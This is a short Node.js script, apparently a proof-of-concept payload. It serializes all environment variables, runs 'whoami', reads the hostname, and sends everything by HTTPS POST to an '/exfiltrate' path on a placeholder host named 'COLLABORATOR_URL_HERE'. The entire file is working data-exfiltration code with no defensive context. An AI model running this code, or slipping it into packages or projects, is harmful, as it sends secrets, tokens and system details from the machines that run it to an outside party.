const https = require('https');
const { exec } = require('child_process');

// Capture environment variables
const envVars = JSON.stringify(process.env);

// Execute the 'whoami' command to get the current user
exec('whoami', (error, stdout, stderr) => {
    if (error) {
        console.error(`Error executing whoami: ${error.message}`);
        return;
    }
    
    if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
    }

    // Exfiltrate both the environment variables and 'whoami' output
    const data = JSON.stringify({
        host: require('os').hostname(),
        envVars: envVars,
        whoami: stdout.trim() // Include the result of 'whoami'
    });

    const options = {
        hostname: 'COLLABORATOR_URL_HERE',
        port: 443,
        path: '/exfiltrate',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    const req = https.request(options, (res) => {
        console.log(`Status: ${res.statusCode}`);
    });

    req.on('error', (error) => {
        console.error(error);
    });

    req.write(data);
    req.end();
});
